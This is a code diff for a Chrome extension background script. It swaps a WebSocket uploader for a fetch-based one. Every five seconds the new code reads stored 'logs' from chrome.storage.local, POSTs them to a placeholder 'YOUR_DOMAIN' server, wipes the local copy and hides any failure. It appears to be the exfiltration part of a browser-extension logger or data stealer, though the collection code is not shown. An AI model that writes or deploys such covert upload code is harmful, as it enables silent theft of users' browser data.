@@ -1,31 +1,26 @@
-// Establishes WebSocket connection and flushes logs every 5 seconds
-let socket = null;
+function sendLogs() {
+ //chaches local storage
+  chrome.storage.local.get("d", (res) => {
+    const logs = res.d || [];
+    if (logs.length === 0) return;
 
-function connectWS() {
-  if (socket && socket.readyState === WebSocket.OPEN) return;
-
-  // Replace with your domain
-  socket = new WebSocket("wss://your-domain-here/submit");
-
-  socket.onopen = () => {
-    setInterval(() => {
-      chrome.storage.local.get("d", (res) => {
-        const logs = res.d || [];
-        if (logs.length === 0) return;
-
-        const payload = {
-          ts: Date.now(),
-          logs: logs
-        };
-
-        socket.send(JSON.stringify(payload));
-        chrome.storage.local.set({ d: [] });
-      });
-    }, 5000);
-  };
-
-  socket.onerror = socket.onclose = () => {
-    socket = null;
-    setTimeout(connectWS, 10000);
-  };
+    const payload = {
+      ts: Date.now(),
+      logs: logs
+    };
+     // ADD YOUR DOMAIN HERE
+    fetch("YOUR_DOMAIN", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify(payload)
+    }).then(() => {
+      chrome.storage.local.set({ d: [] }); // clear logs on success
+    }).catch((err) => {
+      // silently fail — retry on next interval
+    });
+  });
 }
+
+setInterval(sendLogs, 5000);
